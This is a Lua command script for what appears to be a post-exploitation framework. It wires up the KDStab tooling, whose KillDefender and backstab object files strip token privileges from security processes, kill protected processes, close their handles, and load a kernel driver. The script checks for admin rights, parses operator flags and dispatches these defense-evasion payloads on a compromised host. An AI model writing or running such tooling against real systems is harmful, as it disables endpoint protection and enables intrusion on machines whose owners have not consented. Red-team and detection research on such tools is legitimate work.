-- reference: https://github.com/Octoberfest7/KDStab
local function print_table(t) for k, v in pairs(t) do print(k, v) end end

local function ops(args)
    local count = 1
    local arguments = {}
    for _, arg in ipairs(args) do
        if count > 0 then
            -- 检查是否匹配 /key:val 格式
            if string.match(arg, "^/.*:.*") then
                -- 移除开头的 /
                arg = string.gsub(arg, "^/", "")
                -- 按 : 分割为键和值
                local key, val = string.match(arg, "([^:]+):(.*)")
                arguments[key] = val
                -- 检查是否匹配 /flag 格式
            elseif string.match(arg, "^/.*") then
                -- 移除开头的 /
                arg = string.gsub(arg, "^/", "")
                arguments[arg] = "TRUE"
                -- 普通参数
            else
                arguments[tostring(count)] = arg
            end
        end
        count = count + 1
    end

    return arguments
end

local function kdstab(args)

    local barch, handle, data, action, name, pid, listh, killproc, closeh,
          driverpath, servicename, unloaddriver, params
    local session = active()
    if not isadmin(session) then
        error("You need to be an admin to run this command")
    end
    if #args < 2 then error("Usage: kdstab <action> <name>") end
    local arch = session.Os.Arch
    if arch ~= "x64" then error("kdstab only works on x64") end
    action = ""
    name = ""
    pid = ""
    killproc = 0
    listh = 0
    closeh = ""
    driverpath = ""
    servicename = ""
    unloaddriver = 0
    params = ops(args)
    -- print(params)
    print_table(params)
    if params["STRIP"] ~= nil and params["CHECK"] ~= nil then
        error("make sure only one STRIP||CHECK used")
    end
    if params["NAME"] ~= nil then name = params["NAME"] end
    if params["PID"] ~= nil then pid = params["PID"] end
    if params["STRIP"] ~= nil then action = "STRIP" end
    if params["CHECK"] ~= nil then action = "CHECK" end
    if params["KILL"] ~= nil then killproc = 1 end
    if params["LIST"] ~= nil then listh = 1 end
    if params["CLOSE"] ~= nil then closeh = params["CLOSE"] end
    if params["DRIVER"] ~= nil then driverpath = params["DRIVER"] end
    if params["SERVICE"] ~= nil then servicename = params["SERVICE"] end
    if params["UNLOAD"] ~= nil then unloaddriver = 1 end
    -- Additional logic checks
    print(name)
    print(pid)
    if (name ~= "" and pid ~= "") or (name == "" and pid == "") then
        error("Only 1 of name/pid allowed and one of them must be used")
    end

    if (action ~= "") and
        (killproc ~= 0 or listh ~= 0 or closeh ~= "" or driverpath ~= "" or
            servicename ~= "" or unloaddriver ~= 0) then
        error(
            "STRIP||CHECK cannot be used with KILL||LIST||CLOSE||DRIVER||SERVICE||UNLOAD")
    end
    -- #Only 1 of KILL||CLOSE||LIST may be used
    if (killproc ~= 0 and listh ~= 0 and closeh ~= "") or
        (killproc ~= 0 and listh ~= 0) or (killproc ~= 0 and closeh ~= "") or
        (listh ~= 0 and closeh ~= "") or
        (action == "" and killproc == 0 and listh == 0 and closeh == "") then
        error("Only 1 of KILL||CLOSE||LIST may be used")
    end

    -- If STRIP||CHECK used, we are using the KillDefender BOF
    if action ~= "" then
        local bof_file = "KDStab/KillDefender." .. arch .. ".o"
        local packed_args = bof_pack("zzz", action, name, pid)
        if action == "STRIP" then
            print("Stripping " .. name .. pid ..
                      "of token privileges and integrity...")
        else
            print("Checking integrity of " .. name .. pid)
        end
        return bof(session, script_resource(bof_file), packed_args, true)
    else
        local bof_file = "KDStab/backstab." .. arch .. ".o"
        local packed_args = bof_pack("zzsszZZs", name, pid, killproc, listh,
                                     closeh, driverpath, servicename,
                                     unloaddriver)
        if killproc == 1 then
            print("Killing " .. name .. pid .. "...")
        elseif listh == 1 then
            print("Listing handles in" .. name .. pid .. "...")
        else
            print("Closing handle" .. closeh .. " in " .. name .. pid .. "...")
        end
        return bof(session, script_resource(bof_file), packed_args, true)
    end

end

command("common:kdstab", kdstab, "kdstab", "")
